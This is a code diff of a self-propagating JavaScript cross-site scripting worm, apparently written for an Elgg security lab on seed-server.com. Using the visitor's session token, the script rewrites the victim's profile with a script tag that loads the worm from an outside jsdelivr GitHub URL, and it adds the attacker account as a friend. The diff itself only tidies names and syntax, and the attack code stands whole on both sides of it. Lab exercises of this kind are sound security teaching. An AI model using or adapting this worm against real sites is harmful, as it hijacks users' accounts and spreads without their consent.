@@ -10,15 +10,15 @@ window.onload = function(){
     // Script code to propagate the worm by injecting itself into victim's profile description.
     var wormScript = '<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Kenzie-Young/xss-worm@main/xss-worm.js"></script>';
     
-    // Code to update victims profile.
-    var content = "description=" + encodeURIComponent("I work at Google as a dog walker.") + "&worm=" + encodeURIComponent(wormScript); 
+    // Code to update victim's profile.
+    var content = "description=" + encodeURIComponent("I work at Google as a dog walker.") + encodeURIComponent(wormScript); 
 
     var samyGuid = 59;
 
     var sendurl = "http://www.seed-server.com/action/profile/edit";
 
 
-    if(elgg.session.user.guid != samyGuid) {
+    if (elgg.session.user.guid != samyGuid) {
         // Create and send Ajax request to modify profile.
         var Ajax = new XMLHttpRequest();
         Ajax.open("POST", sendurl, true);
@@ -26,11 +26,11 @@ window.onload = function(){
         Ajax.send(content + guid + ts + token);
     }
     
-    //Code to add victim as friend.
-    var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token
+    // Code to add victim as friend.
+    var addFriendUrl = "http://www.seed-server.com/action/friends/add?friend=" + samyGuid + ts + token;
     console.log(addFriendUrl);
-    Ajax=new XMLHttpRequest();
-    Ajax.open("GET", addFriendUrl, true);
-    Ajax.send(); 
+    var AjaxFriend = new XMLHttpRequest();
+    AjaxFriend.open("GET", addFriendUrl, true);
+    AjaxFriend.send(); 
 }
 </script>
